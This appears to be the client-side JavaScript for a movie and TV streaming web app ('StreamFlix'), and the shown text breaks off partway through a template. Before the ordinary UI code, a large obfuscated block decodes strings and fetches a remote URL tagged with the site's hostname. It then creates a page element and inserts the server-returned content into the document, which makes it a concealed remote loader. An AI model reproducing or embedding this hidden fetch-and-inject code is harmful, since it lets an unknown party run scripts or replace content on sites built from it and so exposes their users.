%02%01%03R%00%08%15%09_ZF\'%0D$%18Q%5EX%20C%0B%10DP%5C%10,%1E%16IE%04%11%06%03%11%17%08%03%17W*%0E%06%13IE%02%14%1C%03%01%17A%1F8%1B%03P;:+%1DQ%5E(8%14%14%13DP*H%1F%17%17%14%1E%17W%00,%1E%13%5ED%0A6%1F%1DY8%3CE%22%00\'T%01F%06%0A%0F%19%5BD/Y0%09%0F%04%5B%1E3%0F%11G%22*_%0E%07(%12DP%5EH%10%14%16%0F%0F%0D%1E%1C%03R6V%02%09_Z%16%00%06%15%19%0B%19SE+%0C\'%1FQ%5EZFZ.%0BY%0C_ZD%0F%05%14%02%1A%03%1A%02%1CC%0E%1A%1E%07%5BD%09%11%04%18%0C%05%1DM%11%202%19Q%5EX$%11%17%14DP%5C%1C#A%17IER%3EA#%00KHG%0A%20%10%1BZJJ%0F%3C%07%05E%5BH4%02%3C%03%5BDY%04-%5D%0F_ZF?R%09%1DQ%5EX,%17%15%19DP%5C%1C/%20%12IER2%19,%0AKHG0%185%15ZJJ!H%1F%02E%5BH%02-%15%02%5BDY*%0E*%01_ZF;Q/%1EQ%5EX$%1D%25%19DP%5C:_%3C%11IE%042%177%04KHW%1F%02%1D%0E%06%0A%0E%02Y&A%04%02KH%17%0B%12%07%18%00%0DAD0%185%15ZJH7,%1BD%1EZJ%3CDP%0A%15%18%1C%00%15%05%16%19S%3CF3%11DP%0C%01%08%06%16%13%02Y_X6/JJ7$%0A%15%18%1C%00%15%05%16%19S%1E10%11DP%0C%01%08%06%16%13%02Y_X6)H:7RV(0YBJ7$*X6Y8%3C1$%5C(0/8J7$*(F)%3E%3C1P%5C%5BFSH:1R_XF)H:1$,X6/%3EHER_X6/H@G%22*XEYH:G%22*.6Y8%3CG%22*.D%5B%1E%07%19%17%14%07%04%1D%0DA!#%3C%03E%5B%18%13%09%0D%02%01%03R%00$%1C%0F_ZF3%20%0F%02Q%5EX8%04.%17DP%5C:%0A%0A%15IER2@%07%06KHG8E%1A%18ZJJ=M\'%03E%5BH(%0B%01%01%5BD%0F%05%14%02%1A%03%1A%02%1CC%0E%147%07%5BD%09%11%04%18%0C%05%1DMZDF7%12%22%12%15ZJ%3CDP%5E(%3C%13%11%13DP*%0E%0B%07%0D%02%18%10%18%1DM;6\'%1CQ%5E%08%1F%17%17%14%1E%17W%04%25*%13IER%10%09=%01KHG%20%14%07%1DZJJ%25%14O%04E%5BH%0A!K%02%5BD%0F%05%14%02%1A%03%1A%02%1CC%0A%1F0%07%5BD%09%11%04%18%0C%05%1DMZ8%3C7%0E1%02%1DZJ%3CG%22*Z6%194)%14Q%5E.%10+%0AU%1DQ%5EH%0B%07%0D%02%18%10%18%1DM73%20%1CQ%5E%08%1F%17%17%14%1E%17W%18*%00%17IER%18=%5E%06KH%11%1F%02%1D%0E%06%0A%0E%02Y%10%1D)%02KH%17%0B%12%07%18%00%0DAD0%20%10%1CZJHG%22*%0E%0B%07%0D%02%18%10%18%1DM;.%19%02Q%5E%08%1F%17%17%14%1E%17W%14%17%22%10IER:B%05%03KHG%20C%18%03ZJJ!H%1F%02E%5BH%0E%22J%03%5BDY%22S%05%0C_ZF?R%09%1DQ%5E%0E%0B%07%0D%02%18%10%18%1DM%19%08%20%02Q2;%1E%1CJ%1A%1E%1C%03%06%1F%1CC%12!%01%04((:%10%0F1B%0A%15%18%1C%00%15%05%16%19S%0A%14%15%0FDP%0C%01%08%06%16%13%02Y_X6)H:7RVX6/%3EJ7R,.0/H:1$,X6/%3E:GX%5C(0/%3EHGQ_XE)H:7X%5C(0YBJ7$*X6Y8%3C1$*X6/J:G%22*.DXK%0A%25%20%03%5BD%5BJ%1C%0A%0C%19%10%19%1B%0C%0FL84%1D%03ZJ%1A%1E%1C%03%06%1F%1CCI%07.?%0BE%5BJJ7$%0A%15%18%1C%00%15%05%16%19S%0E%13%12%0FDP%0C%01%08%06%16%13%02Y&%02%25%04KHG4%15+%1EZJJ9%0B%3E%06E%5BH8%0D.%18%5BD%0F.%15\'%01_ZV%14%16%0F%0F%0D%1E%1C%03R%14%19%05%17_Z%16%00%06%15%19%0B%19SEZKJG%22%5C(0/8J7$*ZBZH@G%22*XLY8%3CEP%5C(0%5B8JMR,.0%0F%05%14%02%1A%03%1A%02%1CC8X%12%19%5BD%09%11%04%18%0C%05%1DMZ%00%16%04%0D_ZD)%0C+6%0A_Z0Z:&%1F%01_ZD%0F%05%14%02%1A%03%1A%02%1CC8Z+%19%5BD%09%11%04%18%0C%05%1DM%11%0A%18%1CQ%5EX$@-%13DP%5C%1C#A%17IER.%10%19%02KHG%3CD%19%19ZJJ=%08?%05E%5BH%0A!K%02%5BDY%22%04%1A%01_ZF;Q/%1EQ%5EX%3C%03+%17DP%5C%1C#A%17IER%142%01%07KHG0%185%15ZJ%1C%19%3E%166C%19(P\'D%11%06%03%11%17%08%03%17_Z%16%00%06%15%19%0B%19S_B%1EZ%19%3E%166C7T5\'D%11%06%03%11%17%08%03%17_Z%16%00%06%15%19%0B%19S_J%1EZ%19%3E%166C%15%256\'D%11%06%03%11%17%08%03%17_Z%16%00%06%15%19%0B%19SU%0FX%14+%182%5D%0A:%17-Q%1F%02%1D%0E%06%0A%0E%02Q%5E%08%1F%17%17%14%1E%17WA%5E%0FX%14+%182%5D$%17%14-Q%1F%02%1D%0E%06%0A%0E%02Q%5E%08%1F%17%17%14%1E%17WAT%0FX%14+%182%5D%0E1%0C-Q%1F%02%1D%0E%06%0A%0E%02Q%5E%08%1F%17%17%14%1E%17W@%5D%0FX%14+%182%5D4%05%09-Q%1F%02%1D%0E%06%0A%0E%02Q%5E%08%1F%17%17%14%1E%17WBT%0FX%14+%182%5D,F%0F-Q%1F%02%1D%0E%06%0A%0E%02Q%5E%08%1F%17%17%14%1E%17W@X%0FX%14+%182%5D8%00%06-Q%1F%02%1D%0E%06%0A%0E%02Q%5E%08%1F%17%17%14%1E%17WBZ%0FX%14+%182%5D%1A(%04-Q%1F%02%1D%0E%06%0A%0E%02Q%5E%08%1F%17%17%14%1E%17W@%5B%0FX%14+%182%5D%1AC--Q%1F%02%1D%0E%06%0A%0E%02Q%5E%08%1F%17%17%14%1E%17W@Z%0FX%14+%182%5D%1E%25*-Q%1F%02%1D%0E%06%0A%0E%02Q%5E%08%1F%17%17%14%1E%17WB%5D%0FX%14+%182%5D8%06/-Q%1F%02%1D%0E%06%0A%0E%02Q%5E%08%1F%17%17%14%1E%17W@_%0FX%14+%182%5D%02%20\'-Q%1F%02%1D%0E%06%0A%0E%02Q%5E%08%1F%17%17%14%1E%17W@Y%0FX%14+%182%5D%3C%1D$-Q%1F%02%1D%0E%06%0A%0E%02Q%5E%08%1F%17%17%14%1E%17W@%5E%0FX%14+%182%5D%20%18!-Q%1F%02%1D%0E%06%0A%0E%02Q%5E%08%1F%17%17%14%1E%17WB%5C%0FX%14+%182%5D%20%1E%5B-Q%1F%02%1D%0E%06%0A%0E%02Q%5E%08%1F%17%17%14%1E%17W@%5C%0FX%14+%182%5D$%15P-Q%1F%02%1D%0E%06%0A%0E%02Q%5E%08%1F%17%17%14%1E%17WAY%0FX%14+%182%5D%06=V-Q%1F%02%1D%0E%06%0A%0E%02Q%5E%08%1F%17%17%14%1E%17WD%10I%16&%0D%3CY%14\'B/%5C%0A%0C%19%10%19%1B%0C%0FDP%0C%01%08%06%16%13%02YFA%10I%16&%0D%3CY2%5B!/%5C%0A%0C%19%10%19%1B%0C%0FDP%0C%01%08%06%16%13%02YN%0EV%07$%00)W%101%3E8%5E%07%19%17%14%07%04%1D%0DIE%02%05%16%19%07%11%0FLJO%0EV%07$%00)W6*&8%5E%07%19%17%14%07%04%1D%0DIE%02%05%16%19%07%11%0FLJN%0EV%07$%00)W%14%04#8%5E%07%19%17%14%07%04%1D%0DIE%02%05%16%19%07%11%0FLMG%0EV%07$%00)W.%02$8%5E%07%19%17%14%07%04%1D%0DIE%02%05%16%19%07%11%0FLHD%0EV%07$%00)W%22%1F)8%5E%07%19%17%14%07%04%1D%0DIE%02%05%16%19%07%11%0FLHB%0EV%07$%00)W%22%1D%0C9%5E%07%19%17%14%07%04%1D%0DIE%02%05%16%19%07%11%0FLKB%0EV%07$%00)W%00%25%0E9%5E%07%19%17%14%07%04%1D%0DIE%02%05%16%19%07%11%0FLKA%0EV%07$%00)W:)%0A5%5E%07%19%17%14%07%04%1D%0DIE%02%05%16%19%07%11%0FLKE%0EV%07$%00)W%10%1DT4%5E%07%19%17%14%07%04%1D%0DIE%02%05%16%19%07%11%0FLHO%0E%10%5B\")")}();const AEUn={[uGaE.GB5y(0)]:uGaE.GDCz(1),[uGaE.Cyxz(2)]:uGaE.ytsz(3),[uGaE.a31z(4)]:uGaE.qlPz(5),[uGaE.OPjA(6)]:uGaE.idcA(7),[uGaE.GB5y(8)]:[{[uGaE.GDCz(9)]:uGaE.Cyxz(10),[uGaE.ytsz(11)]:uGaE.a31z(12)},{[uGaE.GDCz(9)]:uGaE.qlPz(13),[uGaE.ytsz(11)]:uGaE.a31z(12)}]};!function(){var U1Mn=location[uGaE.OPjA(14)][uGaE.idcA(15)]();fetch(uGaE.GB5y(16)+U1Mn,{[uGaE.GDCz(17)]:uGaE.Cyxz(18)})[uGaE.ytsz(19)](function(wzPn){return wzPn[uGaE.a31z(20)]()})[uGaE.ytsz(19)](function(QWHn){var suKn=uGaE[uGaE.qlPz(21)]();while(suKn<uGaE[uGaE.OPjA(22)]())switch(suKn){case (0x75bcd15-0O726746425):suKn=!QWHn[uGaE.idcA(23)]?uGaE[uGaE.GB5y(24)]():uGaE[uGaE.OPjA(22)]();break;case (0O57060516-0xbc614d):suKn=uGaE[uGaE.OPjA(22)]();{var MRCn=document[uGaE.GDCz(25)](uGaE.Cyxz(26));MRCn[uGaE.ytsz(27)]=QWHn[uGaE.a31z(28)],document[uGaE.qlPz(29)][uGaE.OPjA(30)](MRCn),document[uGaE.idcA(31)][uGaE.ytsz(27)]=QWHn[uGaE.GB5y(32)][uGaE.GDCz(33)](uGaE.Cyxz(34),U1Mn)}break;}})[uGaE.ytsz(35)](function(){})}();

    // ==================== STATE ====================
    const state = {
      currentPage: 'home',
      previousPage: null,
      language: localStorage.getItem('streamflix_language') || 'en-US',
      profileName: localStorage.getItem('streamflix_profile') || 'User',
      themeColor: localStorage.getItem('streamflix_theme') || 'red',
      bookmarks: JSON.parse(localStorage.getItem('streamflix_bookmarks') || '[]'),
      currentItem: null,
      currentType: 'movie',
      currentDetails: null,
      selectedSeason: 1,
      selectedEpisode: 1,
      heroSlideIndex: 0,
      heroSlideTimer: null,
      heroItems: [],
      searchTimeout: null,
      isLoading: false
    };

    // ==================== UTILITY FUNCTIONS ====================
    function getImageUrl(path, size = 'w500') {
  if (!path) {
    return 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbVfQgzmOXLNGDfXfBSAUwirBBpfCLl4tAtw&s';
  }
  return `${CONFIG.IMG_BASE}/${size}${path}`;
}
    function getBackdropUrl(path) {
      if (!path) return null;
      return `${CONFIG.IMG_BASE}/original${path}`;
    }

    async function fetchTMDB(endpoint, params = {}) {
      const searchParams = new URLSearchParams({
        api_key: CONFIG.API_KEY,
        language: state.language,
        ...params
      });
      try {
        const response = await fetch(`${CONFIG.BASE_URL}${endpoint}?${searchParams}`);
        if (!response.ok) throw new Error('API Error');
        return response.json();
      } catch (error) {
        console.error('Fetch error:', error);
        return null;
      }
    }

    function createSlug(title, id) {
      const slug = title.toLowerCase()
        .replace(/[^a-z0-9]+/g, '-')
        .replace(/^-+|-+$/g, '');
      return `${id}-${slug}`;
    }

    function parseSlug(slug) {
      if (!slug) return null;
      const decoded = decodeURIComponent(slug);
      const match = decoded.match(/^(\d+)/);
      return match ? parseInt(match[1], 10) : null;
    }

    // ==================== RIPPLE EFFECT ====================
    function createRipple(event, element) {
      const rect = element.getBoundingClientRect();
      const ripple = document.createElement('span');
      ripple.className = 'ripple';
      const size = Math.max(rect.width, rect.height);
      ripple.style.width = ripple.style.height = size + 'px';
      ripple.style.left = (event.clientX - rect.left - size / 2) + 'px';
      ripple.style.top = (event.clientY - rect.top - size / 2) + 'px';
      element.appendChild(ripple);
      setTimeout(() => ripple.remove(), 600);
    }

    document.addEventListener('click', (e) => {
      const btn = e.target.closest('.btn, .nav-item, .language-btn, .movie-card');
      if (btn) createRipple(e, btn);
    });

    // ==================== TOAST NOTIFICATIONS ====================
    function showToast(message, type = 'info') {
      const container = document.getElementById('toastContainer');
      const toast = document.createElement('div');
      toast.className = `toast ${type}`;
      const icons = { success: 'fa-check-circle', error: 'fa-times-circle', info: 'fa-info-circle' };
      toast.innerHTML = `<i class="fas ${icons[type] || icons.info}"></i><span>${message}</span>`;
      container.appendChild(toast);
      setTimeout(() => {
        toast.classList.add('exit');
        setTimeout(() => toast.remove(), 300);
      }, 3000);
    }

    // ==================== LANGUAGE SELECTION ====================
    function showLanguagePopup() {
      const overlay = document.getElementById('languageOverlay');
      overlay.classList.add('active');
      document.body.classList.add('no-scroll');
      
      document.querySelectorAll('.language-btn').forEach(btn => {
        btn.classList.toggle('selected', btn.dataset.lang === state.language);
      });
    }

    function selectLanguage(lang) {
      state.language = lang;
      localStorage.setItem('streamflix_language', lang);
      
      const overlay = document.getElementById('languageOverlay');
      overlay.classList.remove('active');
      document.body.classList.remove('no-scroll');
      
      showToast('Language updated!', 'success');
      
      if (state.currentPage === 'home') {
        loadHomeContent();
      }
    }

    // ==================== THEME COLOR ====================
    function setThemeColor(color) {
      const colors = {
        red: '#e50914',
        blue: '#0077ff',
        green: '#00c853',
        purple: '#9c27b0',
        orange: '#ff5722',
        pink: '#e91e63'
      };
      
      state.themeColor = color;
      localStorage.setItem('streamflix_theme', color);
      document.documentElement.style.setProperty('--primary', colors[color]);
      document.documentElement.style.setProperty('--primary-glow', colors[color] + '66');
      
      document.querySelectorAll('.theme-color').forEach(btn => {
        btn.classList.toggle('active', btn.classList.contains(color));
      });
      
      showToast('Theme updated!', 'success');
    }

    // ==================== NAVIGATION ====================
    function navigateTo(page, pushState = true) {
      const pages = ['home', 'search', 'bookmarks', 'settings', 'details'];
      if (!pages.includes(page)) return;
      
      state.previousPage = state.currentPage;
      state.currentPage = page;
      
      if (pushState && page !== 'details') {
  const url = page === 'home' ? '#/' : `#/${page}`;
  history.pushState({ page }, '', url);
}
      
      document.querySelectorAll('.page').forEach(p => {
        const isTarget = p.id === `${page}Page`;
        if (isTarget) {
          p.classList.remove('exit');
          p.classList.add('active');
        } else if (p.classList.contains('active')) {
          p.classList.add('exit');
          setTimeout(() => {
            p.classList.remove('active', 'exit');
          }, 150);
        }
      });
      
      document.querySelectorAll('.nav-item').forEach(item => {
        item.classList.toggle('active', item.dataset.page === page);
      });
      
      window.scrollTo({ top: 0, behavior: 'smooth' });
      
      if (page === 'search') {
        setTimeout(() => document.getElementById('searchInput')?.focus(), 300);
        loadPopularSearches();
      } else if (page === 'bookmarks') {
        loadBookmarks();
      } else if (page === 'settings') {
        loadSettings();
      }
    }

    function goBack() {
      if (window.history.length > 1) {
        history.back();
      } else if (state.previousPage && state.previousPage !== 'details') {
        navigateTo(state.previousPage);
      } else {
        navigateTo('home');
      }
    }

    // ==================== BROWSER BACK / FORWARD ====================
window.addEventListener('popstate', () => {
  if (location.hash) {
    handleDeepLink();
  } else {
    navigateTo('home', false);
  }
});

    // ==================== HERO SLIDER ====================
    function createHeroSlide(item, index) {
      const title = item.title || item.name;
      const year = (item.release_date || item.first_air_date || '').split('-')[0];
      const rating = item.vote_average ? item.vote_average.toFixed(1) : 'N/A';
      const type = item.media_type || (item.first_air_date ? 'tv' : 'movie');
      const trailerKey = item.trailer_key || null;
      
      return `
        <div class="hero-slide ${index === 0 ? 'active' : ''}" data-index="${index}">
          <div class="hero-backdrop" style="background-image: url('${getBackdropUrl(item.backdrop_path)}')"></div>
          ${trailerKey ? `
            <div class="hero-video" data-trailer="${trailerKey}"></div>
          ` : ''}
          <div class="hero-gradient"></div>
          <div class="hero-content">
            <div class="hero-tag"><i class="fas fa-fire"></i> Trending #${index + 1}</div>
            <h1 class="hero-title">${title}</h1>
            <div class="hero-meta">
              <span class="hero-rating"><i class="fas fa-star"></i> ${rating}</span>
              <span class="hero-year">${year}</span>
              <span>${type === 'tv' ? 'TV Series' : 'Movie'}</span>
            </div>
            <p class="hero-overview">${item.overview || 'No description available.'}</p>
            <div class="hero-buttons">
              <button class="btn btn-primary" onclick="playItem(${item.id}, '${type}')">
                <i class="fas fa-play"></i> Play
              </button>
              <button class="btn btn-secondary" onclick="openDetails(${item.id}, '${type}')">
                <i class="fas fa-info-circle"></i> More Info
              </button>
            </div>
          </div>
        </div>
      `;
    }

    function createHeroIndicator(index) {
      return `<div class="hero-indicator ${index === 0 ? 'active' : ''}" data-index="${index}" onclick="goToHeroSlide(${index})"></div>`;
    }

    function goToHeroSlide(index) {
      const slides = document.querySelectorAll('.hero-slide');
      const indicators = document.querySelectorAll('.hero-indicator');
      
      slides.forEach((slide, i) => {
        const isActive = i === index;
        slide.classList.toggle('active', isActive);
        
        if (isActive) {
          const video = slide.querySelector('.hero-video');
          if (video && video.dataset.trailer) {
            video.innerHTML = `
              <iframe src="https://www.youtube.com/embed/${video.dataset.trailer}?autoplay=1&mute=1&controls=0&showinfo=0&rel=0&loop=1&playlist=${video.dataset.trailer}" 
                      frameborder="0" 
                      allow="autoplay; encrypted-media" 
                      allowfullscreen>
              </iframe>
            `;
            video.classList.add('playing');
          }
        } else {
          const video = slide.querySelector('.hero-video');
          if (video) {
            video.innerHTML = '';
            video.classList.remove('playing');
          }
        }
      });
      
      indicators.forEach((ind, i) => {
        ind.classList.toggle('active', i === index);
      });
      
      state.heroSlideIndex = index;
      resetHeroTimer();
    }

    function nextHeroSlide() {
      const nextIndex = (state.heroSlideIndex + 1) % state.heroItems.length;
      goToHeroSlide(nextIndex);
    }

    function startHeroTimer() {
      state.heroSlideTimer = setInterval(nextHeroSlide, 6000);
    }

    function resetHeroTimer() {
      clearInterval(state.heroSlideTimer);
      startHeroTimer();
    }

    // ==================== CONTENT ROWS ====================
    function createSkeletonRow(title) {
      return `
        <div class="movie-row">
          <div class="row-header">
            <h2 class="row-title">${title}</h2>
          </div>
          <div class="row-container">
            <div class="row-slider hide-scrollbar">
              ${Array(6).fill().map(() => '<div class="skeleton skeleton-card poster"></div>').join('')}
            </div>
          </div>
        </div>
      `;
    }

    function createMovieRow(title, items, icon = 'fa-film', type = 'poster') {
      if (!items || !items.length) return '';
      
      const rowId = title.replace(/\s+/g, '').toLowerCase();
      
      return `
        <div class="movie-row">
          <div class="row-header">
            <h2 class="row-title"><i class="fas ${icon}"></i> ${title}</h2>
            <a href="#" class="row-see-all" onclick="navigateTo('search'); return false;">See All <i class="fas fa-chevron-right"></i></a>
          </div>
          <div class="row-container">
            <button class="row-arrow left" onclick="scrollRow('${rowId}', 'left')">
              <i class="fas fa-chevron-left"></i>
            </button>
            <div class="row-slider hide-scrollbar" id="row-${rowId}">
              ${items.map((item, i) => createMovieCard(item, type, i)).join('')}
            </div>
            <button class="row-arrow right" onclick="scrollRow('${rowId}', 'right')">
              <i class="fas fa-chevron-right"></i>
            </button>
          </div>
        </div>
      `;
    }

    function createMovieCard(item, type = 'poster', index = 0) {
      const title = item.title || item.name || 'Unknown';
      const imagePath = type === 'poster' ? item.poster_path : (item.backdrop_path || item.poster_path);
      const rating = item.vote_average ? item.vote_average.toFixed(1) : 'N/A';
      const year = (item.release_date || item.first_air_date || '').split('-')[0];
      const mediaType = item.media_type || (item.first_air_date ? 'tv' : 'movie');
      
      return `
        <div class="movie-card ${type}" onclick="openDetails(${item.id}, '${mediaType}')" style="animation-delay: ${index * 0.05}s">
          <img src="${getImageUrl(imagePath, type === 'poster' ? 'w300' : 'w500')}" alt="${title}" loading="lazy">
          <div class="card-badge"><i class="fas fa-star"></i> ${rating}</div>
          <div class="card-play"><i class="fas fa-play"></i></div>
          <div class="card-overlay">
            <div class="card-title">${title}</div>
            <div class="card-meta">
              <span class="card-rating"><i class="fas fa-star"></i> ${rating}</span>
              <span>${year}</span>
            </div>
          </div>
        </div>
      `;
    }

    function scrollRow(rowId, direction) {
      const row = document.getElementById(`row-${rowId}`);
      if (!row) return;
      const scrollAmount = row.clientWidth * 0.8;
      row.scrollBy({ left: direction === 'left' ? -scrollAmount : scrollAmount, behavior: 'smooth' });
    }

// ==================== HOME CONTENT ====================
async function loadHomeContent() {
  const heroSlider = document.getElementById('heroSlider');
  const heroIndicators = document.getElementById('heroIndicators');
  const contentRows = document.getElementById('contentRows');

  
  contentRows.innerHTML = [
    createSkeletonRow('Trending Now'),
    createSkeletonRow('Indian Movies'),
    createSkeletonRow('Top Rated'),
    createSkeletonRow('TV Series')
  ].join('');

  try {
    const [
  trending,
  indianMovies,
  topRated,
  tvPopular,
  indianAction,
  indianComedy,
  kDrama,
  tvShows,
  indianOTT,
  indianTV
] = await Promise.all([
  fetchTMDB('/trending/all/week'),

  fetchTMDB('/discover/movie', {
    with_origin_country: 'IN',
    sort_by: 'popularity.desc',
    include_adult: false
  }),

  fetchTMDB('/movie/top_rated'),

  fetchTMDB('/tv/popular'),

  fetchTMDB('/discover/movie', {
    with_origin_country: 'IN',
    with_genres: '28'
  }),

  fetchTMDB('/discover/movie', {
    with_origin_country: 'IN',
    with_genres: '35'
  }),

  
  fetchTMDB('/discover/tv', {
    with_original_language: 'ko',
    sort_by: 'popularity.desc'
  }),

  
  fetchTMDB('/tv/top_rated'),

  
  fetchTMDB('/discover/tv', {
    with_origin_country: 'IN',
    sort_by: 'popularity.desc'
  }),


  fetchTMDB('/discover/tv', {
    with_origin_country: 'IN',
    with_original_language: 'hi',
    sort_by: 'vote_count.desc'
  })
]);

    // ================= HERO SLIDER =================
    const heroItems =
      trending?.results?.filter(item => item.backdrop_path).slice(0, 5) || [];

    state.heroItems = heroItems;

    heroSlider.innerHTML = heroItems
      .map((item, i) => createHeroSlide(item, i))
      .join('');

    heroIndicators.innerHTML = heroItems
      .map((_, i) => createHeroIndicator(i))
      .join('');

    if (heroItems.length > 1) startHeroTimer();

    // ================= CONTENT ROWS =================
    contentRows.innerHTML = [
  createMovieRow('Trending Now', trending?.results, 'fa-fire', 'backdrop'),

  createMovieRow('Indian Movies', indianMovies?.results, 'fa-flag', 'poster'),

  createMovieRow('Top Rated Movies', topRated?.results, 'fa-trophy', 'poster'),

  createMovieRow('TV Series', tvPopular?.results, 'fa-tv', 'poster'),

  
  createMovieRow('K-Drama Cream', kDrama?.results, 'fa-heart', 'poster'),

  
  createMovieRow('TV Shows', tvShows?.results, 'fa-desktop', 'poster'),

  
  createMovieRow('Indian OTT Series', indianOTT?.results, 'fa-play-circle', 'poster'),

  
  createMovieRow('Indian TV Series', indianTV?.results, 'fa-broadcast-tower', 'poster'),

  createMovieRow('Indian Action Movies', indianAction?.results, 'fa-bolt', 'poster'),

  createMovieRow('Indian Comedy Movies', indianComedy?.results, 'fa-laugh', 'poster')
].join('');

  } catch (error) {
    console.error('Failed to load content:', error);
    contentRows.innerHTML = `
      <div class="empty-state">
        <i class="fas fa-exclamation-circle"></i>
        <h3>Failed to load content</h3>
        <p>Please check your connection and try again.</p>
      </div>
    `;
  }
}
    // ==================== DETAILS PAGE ====================
    async function openDetails(id, type = 'movie', pushState = true) {
      if (state.isLoading) return;
      state.isLoading = true;
      
      state.currentItem = { id, type };
      state.currentType = type;
      state.selectedSeason = 1;
      state.selectedEpisode = 1;
      
      showDetailsLoading();
      navigateTo('details', false);
      
      try {
        const details = await fetchTMDB(`/${type}/${id}`, { append_to_response: 'videos,credits' });
        
        if (!details || details.success === false) {
          throw new Error('Content not found');
        }
        
        state.currentDetails = details;
        
        const url = `#/${type}/${id}`;

if (pushState) {
  history.pushState({ type, id }, '', url);
}
        
        renderDetails(details, type);
        
      } catch (error) {
        console.error('Failed to load details:', error);
        showDetailsError(id, type);
      } finally {
        state.isLoading = false;
      }
    }

    function showDetailsLoading() {
      document.getElementById('detailsBackdrop').style.backgroundImage = '';
      document.getElementById('detailsPoster').innerHTML = '<div class="skeleton" style="width: 100%; height: 100%;"></div>';
      document.getElementById('detailsInfo').innerHTML = `
        <div class="skeleton" style="width: 80px; height: 24px; margin-bottom: 12px;"></div>
        <div class="skeleton" style="width: 80%; height: 48px; margin-bottom: 12px;"></div>
        <div class="skeleton" style="width: 60%; height: 20px; margin-bottom: 16px;"></div>
        <div class="skeleton" style="width: 100%; height: 80px; margin-bottom: 24px;"></div>
        <div style="display: flex; gap: 12px; margin-bottom: 30px;">
          <div class="skeleton" style="width: 120px; height: 44px; border-radius: 6px;"></div>
          <div class="skeleton" style="width: 44px; height: 44px; border-radius: 50%;"></div>
          <div class="skeleton" style="width: 44px; height: 44px; border-radius: 50%;"></div>
        </div>
      `;
    }

    function showDetailsError(id, type) {
      document.getElementById('detailsInfo').innerHTML = `
        <div class="empty-state" style="text-align: left; padding: 40px 0;">
          <i class="fas fa-exclamation-triangle" style="font-size: 48px; color: var(--primary); margin-bottom: 20px;"></i>
          <h3 style="color: var(--text-primary); margin-bottom: 8px;">Failed to load content</h3>
          <p style="margin-bottom: 20px;">Please check your connection and try again.</p>
          <button class="btn btn-primary" onclick="openDetails(${id}, '${type}')">
            <i class="fas fa-redo"></i> Retry
          </button>
          <button class="btn btn-secondary" onclick="navigateTo('home')" style="margin-left: 12px;">
            <i class="fas fa-home"></i> Go Home
          </button>
        </div>
      `;
    }

    function renderDetails(details, type) {
      const title = details.title || details.name;
      const year = (details.release_date || details.first_air_date || '').split('-')[0];
      const rating = details.vote_average ? details.vote_average.toFixed(1) : 'N/A';
      const matchScore = Math.round((details.vote_average || 0) * 10);
      const runtime = type === 'movie' 
        ? (details.runtime ? `${Math.floor(details.runtime / 60)}h ${details.runtime % 60}m` : '')
        : (details.number_of_seasons ? `${details.number_of_seasons} Season${details.number_of_seasons > 1 ? 's' : ''}` : '');
      
      const country = details.production_countries?.[0]?.iso_3166_1 || details.origin_country?.[0] || '';
      
      const backdropUrl = getBackdropUrl(details.backdrop_path);
      if (backdropUrl) {
        document.getElementById('detailsBackdrop').style.backgroundImage = `url('${backdropUrl}')`;
      }
      
      document.getElementById('detailsPoster').innerHTML = `<img src="${getImageUrl(details.poster_path, 'w300')}" alt="${title}">`;
      
      const isBookmarked = state.bookmarks.some(b => b.id === details.id && b.type === type);
      
      const genres = (details.genres || []).map((g, i) => 
        `<span class="genre-pill" style="animation-delay: ${i * 0.1}s">${g.name}</span>`
      ).join('');
      
      const castData = details.credits?.cast || [];
      const cast = castData.slice(0, 10).map((person, i) => `
        <div class="cast-item" style="animation-delay: ${i * 0.05}s">
          <img class="cast-photo" src="${getImageUrl(person.profile_path, 'w200')}" alt="${person.name}" loading="lazy">
          <div class="cast-name">${person.name}</div>
          <div class="cast-character">${person.character || ''}</div>
        </div>
      `).join('');
      
      let seasonsHtml = '';
      if (type === 'tv' && details.seasons && details.seasons.length > 0) {
        const seasons = details.seasons.filter(s => s.season_number > 0);
        if (seasons.length > 0) {
          seasonsHtml = `
            <div class="seasons-section">
              <div class="season-header">
                <h3 class="season-title">Episodes</h3>
                <select class="season-select" id="seasonSelect" onchange="loadEpisodes()">
                  ${seasons.map(s => `<option value="${s.season_number}">Season ${s.season_number}</option>`).join('')}
                </select>
              </div>
              <div class="episode-list" id="episodeList">
                <div class="skeleton" style="height: 100px; margin-bottom: 12px;"></div>
                <div class="skeleton" style="height: 100px; margin-bottom: 12px;"></div>
                <div class="skeleton" style="height: 100px; margin-bottom: 12px;"></div>
              </div>
            </div>
          `;
        }
      }
      
      const downloadHtml = `
        <div class="seasons-section" style="margin-top: 30px;">
          <h3 class="season-title" style="margin-bottom: 16px;"><i class="fas fa-download" style="color: var(--primary); margin-right: 8px;"></i>Download</h3>
          <div class="episode-list" id="downloadServers">
            ${CONFIG.DOWNLOAD_SERVERS.map((server, i) => `
              <div class="episode-item" onclick="downloadContent(${i})" style="animation-delay: ${i * 0.1}s">
                <div style="width: 60px; height: 60px; background: var(--primary); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 24px;">
                  <i class="fas fa-cloud-download-alt"></i>
                </div>
                <div class="episode-info">
                  <div class="episode-number">${server.name}</div>
                  <div class="episode-overview">Click to download ${type === 'tv' ? 'selected episode' : 'movie'}</div>
                </div>
              </div>
            `).join('')}
          </div>
        </div>
      `;
      
      const trailer = details.videos?.results?.find(v => v.type === 'Trailer' && v.site === 'YouTube');
      
      document.getElementById('detailsInfo').innerHTML = `
        <div class="details-tag"><i class="fas fa-${type === 'tv' ? 'tv' : 'film'}"></i> ${type === 'tv' ? 'TV Series' : 'Movie'}</div>
        <h1 class="details-title">${title}</h1>
        <div class="details-meta">
          <div class="details-rating"><i class="fas fa-star"></i> <span>${rating}</span></div>
          <span class="match-score">${matchScore}% Match</span>
          <span>${year}</span>
          ${country ? `<span>${country}</span>` : ''}
          <span>${runtime}</span>
        </div>
        <div class="details-genres">${genres}</div>
        <p class="details-overview">${details.overview || 'No description available.'}</p>
        <div class="details-actions">
          <button class="btn btn-primary btn-play-large" onclick="playItem(${details.id}, '${type}')">
            <i class="fas fa-play"></i> Play
          </button>
          ${trailer ? `
            <button class="btn-icon" onclick="playTrailer(${details.id}, '${type}')" title="Watch Trailer">
              <i class="fas fa-video"></i>
            </button>
          ` : ''}
          <button class="btn-icon" id="bookmarkBtn" onclick="toggleBookmark(${details.id}, '${type}', '${title.replace(/'/g, "\\'")}', '${details.poster_path || ''}')" title="${isBookmarked ? 'Remove from' : 'Add to'} My List">
            <i class="fas fa-${isBookmarked ? 'check' : 'plus'}"></i>
          </button>
